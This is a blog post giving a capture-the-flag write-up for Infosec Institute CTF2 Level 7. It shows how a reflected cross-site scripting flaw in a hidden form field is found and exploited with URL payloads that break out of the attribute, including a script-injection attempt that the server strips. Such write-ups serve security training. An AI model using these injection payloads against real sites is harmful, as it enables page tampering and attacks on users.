---
layout: post
title: Infosec Institute CTF2 Practical Web Hacking Level 7
category: Web
tags: CTF challenges
---

# ctf.infosecinstitute.com: Level 7
**Vulnerability** A3 Cross-Site Scripting (XSS)
**Description:**

![screen]({{site.url}}/assets/Screen Shot 2015-07-17 at 1.38.50 PM.png)

## Write-up

For almost all levels I will be using Burpsuite. Burpsuite is an interception proxy that lets us modify the HTTP request
 / response by intercepting the data between the browser and the web server.
 
First let's inspect the source for anything interesting.

{% highlight html linenos %}
<form class="ex7-form" action="">
	<label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
	<input type="text" id="name" name="name" class="form-control input-lg"/>
	<label for="pass">   <span class="glyphicon glyphicon-lock"></span>Password:</label>
	<input type="password" id="pass" name="pass" class="form-control input-lg"/>
	<input name="action" type="hidden" value='/ctf2/exercises/ex7.php               '>
	<div>
		<input type="submit" class="btn btn-lg btn-default" value="Login"/>
		<input type="reset" class="btn btn-lg btn-danger" value="Reset"/>
	</div>
</form>
{% endhighlight %}

We see a "hidden" form that looks interesting... From the level description we know that since we need to share the page
with users, the XSS will be Reflective. Reflective XSS is done via the URL, let's start testing the URL.

If we insert '/TEST' at the end of the URL and inspect the source again, we will see that our string is being appended to the
hidden input field.

{% highlight html linenos %}
<form class="ex7-form" action="">
	<label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
	<input type="text" id="name" name="name" class="form-control input-lg"/>
	<label for="pass">   <span class="glyphicon glyphicon-lock"></span>Password:</label>
	<input type="password" id="pass" name="pass" class="form-control input-lg"/>
	<input name="action" type="hidden" value='/ctf2/exercises/ex7.php/TEST               '>
	<div>
        <input type="submit" class="btn btn-lg btn-default" value="Login"/>
		<input type="reset" class="btn btn-lg btn-danger" value="Reset"/>
	</div>
</form>
{% endhighlight %}

So to insert a &lt;h1&gt; tag, we need to inject a closing tag SQL injection style.

Final injection payload in the URL:

{% highlight text %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php/'><h1>Blah</h1>
{% endhighlight %} 

The source now looks like this:

{% highlight html linenos %}
<form class="ex7-form" action="">
    <label for="name">    <span class="glyphicon glyphicon-user"></span>Username:</label>
    <input type="text" id="name" name="name" class="form-control input-lg"/>
    <label for="pass">   <span class="glyphicon glyphicon-lock"></span>Password:</label>
    <input type="password" id="pass" name="pass" class="form-control input-lg"/>
    <input name="action" type="hidden" value='/'><h1>Blah</h1>               '>
    <div>
        <input type="submit" class="btn btn-lg btn-default" value="Login"/>
    	<input type="reset" class="btn btn-lg btn-danger" value="Reset"/>
	</div>
</form>
{% endhighlight %}

With the "/'&gt;" we are closing the current HTML tag and injecting the &lt;h1&gt;&lt;/h1&gt; tag.

![screen2]({{site.url}}/assets/Screen Shot 2015-07-17 at 3.42.45 PM.png)

I tried injecting some JavaScript so I can replace the "YOUR NAME HERE" text but it looks like JavaScript or anything that's not
&lt;h1&gt; gets stripped at the server side.

Injection URL:

{% highlight text linenos %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php/'><script>document.getElementsByClassName("label")[0].innerHTML = "<h1>The bishokukai were here!</h1>";</script>
{% endhighlight %}

And if we see the source, we will notice the &lt;script&gt; is stripped.

{% highlight html linenos %}
<input name="action" type="hidden" value='/ctf2/exercises/ex7.php/'>document.getElementsByClassName("label")[0].innerHTML = "<h1>The bishokukai were here!</h1>";               '>
<div>
{% endhighlight %}

## Links

* <http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php>
